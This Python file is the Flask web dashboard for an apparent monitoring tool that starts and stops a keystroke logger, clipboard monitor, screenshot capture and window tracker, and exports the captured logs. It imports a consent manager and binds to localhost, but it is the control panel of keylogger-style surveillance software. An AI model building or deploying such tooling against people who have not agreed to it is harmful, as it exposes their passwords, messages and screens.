import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_socketio import SocketIO, emit

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from config.settings import (
    APP_NAME, APP_VERSION, APP_TAGLINE, SESSION_ID,
    AUTO_STOP_HOURS, BUFFER_SIZE, FLUSH_INTERVAL_SECONDS,
    CAPTURE_SPECIAL_KEYS, CAPTURE_TIMESTAMPS,
    CLIPBOARD_ENABLED, CLIPBOARD_POLL_INTERVAL,
    SCREENSHOT_ENABLED, SCREENSHOT_INTERVAL,
    SCREENSHOT_QUALITY, SCREENSHOT_FORMAT, SCREENSHOT_DIR,
    EMAIL_ENABLED, LOG_DIR, EXPORT_DIR,
)
from utils.encryption import EncryptionManager
from core.keylogger import KeystrokeEngine
from core.clipboard import ClipboardMonitor
from core.screenshot import ScreenshotCapture
from core.window_tracker import WindowTracker
from storage.file_handler import FileHandler
from utils.system_info import SystemProfiler
from utils.consent import ConsentManager

app = Flask(__name__, template_folder="templates")
app.config["SECRET_KEY"] = "cybersentinel-web-key"
socketio = SocketIO(app, async_mode="threading")

crypto            = EncryptionManager()
keylogger         = KeystrokeEngine(encryption_manager=crypto)
clipboard_monitor = ClipboardMonitor(encryption_manager=crypto)
screenshot_capture = ScreenshotCapture()
window_tracker    = WindowTracker()
file_handler      = FileHandler(encryption_manager=crypto)
sys_profiler      = SystemProfiler()
consent_mgr       = ConsentManager()

_monitoring = False

def _on_key_event(record):
    socketio.emit("keystroke", record)

def _on_clip_event(entry):
    socketio.emit("clipboard_update", entry)

keylogger.set_key_callback(_on_key_event)
clipboard_monitor.set_capture_callback(_on_clip_event)

@app.route("/")
def index():
    return render_template(
        "web_dashboard.html",
        app_name=APP_NAME,
        app_version=APP_VERSION,
        app_tagline=APP_TAGLINE,
        session_id=SESSION_ID,
        auto_stop_hours=AUTO_STOP_HOURS,
    )

@app.route("/api/stats")
def api_stats():
    return jsonify({
        "keylogger":      keylogger.get_stats(),
        "clipboard":      clipboard_monitor.get_stats(),
        "screenshot":     screenshot_capture.get_stats(),
        "window_tracker": window_tracker.get_stats(),
        "encryption":     crypto.get_status(),
        "monitoring":     _monitoring,
    })

@app.route("/api/sysinfo")
def api_sysinfo():
    try:
        return jsonify(sys_profiler.collect_all())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/logs")
def api_logs():
    return jsonify(file_handler.list_log_files())

@app.route("/api/storage")
def api_storage():
    return jsonify(file_handler.get_storage_stats())

@app.route("/api/screenshots/list")
def api_screenshot_list():
    return jsonify(screenshot_capture.get_recent_captures())

@app.route("/screenshots/<path:filename>")
def serve_screenshot(filename):
    return send_from_directory(str(SCREENSHOT_DIR), filename)

@app.route("/api/settings")
def api_settings():
    return jsonify({
        "buffer_size":              BUFFER_SIZE,
        "flush_interval":           FLUSH_INTERVAL_SECONDS,
        "capture_special_keys":     CAPTURE_SPECIAL_KEYS,
        "capture_timestamps":       CAPTURE_TIMESTAMPS,
        "clipboard_enabled":        CLIPBOARD_ENABLED,
        "clipboard_poll_interval":  CLIPBOARD_POLL_INTERVAL,
        "screenshot_enabled":       SCREENSHOT_ENABLED,
        "screenshot_interval":      SCREENSHOT_INTERVAL,
        "screenshot_quality":       SCREENSHOT_QUALITY,
        "screenshot_format":        SCREENSHOT_FORMAT,
        "email_enabled":            EMAIL_ENABLED,
        "auto_stop_hours":          AUTO_STOP_HOURS,
        "log_dir":                  str(LOG_DIR),
        "screenshot_dir":           str(SCREENSHOT_DIR),
        "export_dir":               str(EXPORT_DIR),
    })

@app.route("/api/export/<fmt>", methods=["POST"])
def api_export(fmt):
    if fmt not in ("txt", "csv", "json"):
        return jsonify({"error": "Invalid format"}), 400
    try:
        path = file_handler.export_logs(output_format=fmt)
        return jsonify({"success": True, "path": str(path)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/api/screenshot/capture", methods=["POST"])
def api_capture_screenshot():
    path = screenshot_capture.capture_now()
    if path:
        return jsonify({"success": True, "path": str(path)})
    return jsonify({"error": "Capture failed"}), 500

@socketio.on("start_monitoring")
def handle_start():
    global _monitoring
    if not _monitoring:
        keylogger.start()
        clipboard_monitor.start()
        screenshot_capture.start()
        window_tracker.start()
        _monitoring = True
    emit("monitoring_status", {"active": True}, broadcast=True)

@socketio.on("stop_monitoring")
def handle_stop():
    global _monitoring
    if _monitoring:
        keylogger.stop()
        clipboard_monitor.stop()
        screenshot_capture.stop()
        window_tracker.stop()
        _monitoring = False
    emit("monitoring_status", {"active": False}, broadcast=True)

@socketio.on("connect")
def handle_connect():
    emit("monitoring_status", {"active": _monitoring})

def _broadcast_stats():
    while True:
        socketio.sleep(1)
        try:
            cpu = psutil.cpu_percent(interval=0) if PSUTIL_AVAILABLE else 0
            ram = psutil.virtual_memory().percent if PSUTIL_AVAILABLE else 0
        except Exception:
            cpu, ram = 0, 0

        data = {
            "keylogger":      keylogger.get_stats(),
            "clipboard":      clipboard_monitor.get_stats(),
            "screenshot":     screenshot_capture.get_stats(),
            "window_tracker": window_tracker.get_stats(),
            "cpu": cpu,
            "ram": ram,
            "monitoring": _monitoring,
        }
        socketio.emit("stats_update", data)

if __name__ == "__main__":
    socketio.start_background_task(_broadcast_stats)
    print()
    print(f"  [*] {APP_NAME} - Web Dashboard")
    print(f"  ================================")
    print(f"  [>] http://127.0.0.1:5000")
    print(f"  [>] Session: {SESSION_ID}")
    print(f"  [>] Press Ctrl+C to stop")
    print()
    socketio.run(
        app,
        host="127.0.0.1",
        port=5000,
        debug=False,
        allow_unsafe_werkzeug=True,
    )
